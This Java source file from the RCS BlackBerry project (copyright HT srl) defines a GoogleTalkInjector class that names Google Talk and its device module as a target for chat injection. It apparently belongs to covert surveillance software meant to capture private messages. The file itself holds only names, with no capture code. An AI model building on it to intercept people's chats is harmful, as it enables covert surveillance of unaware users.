//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class GoogleTalkInjector extends ChatGroupInjector {

    //#ifdef DEBUG
    private static Debug debug = new Debug("GTalkInjector", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    public String getAppName() {
        // G.1=Google Talk
        return Messages.getString("G.1"); //$NON-NLS-1$
    }

    public String getCodName() {
        //  G.2=net_rim_bb_qm_google
        return Messages.getString("G.2"); //$NON-NLS-1$
    }

}
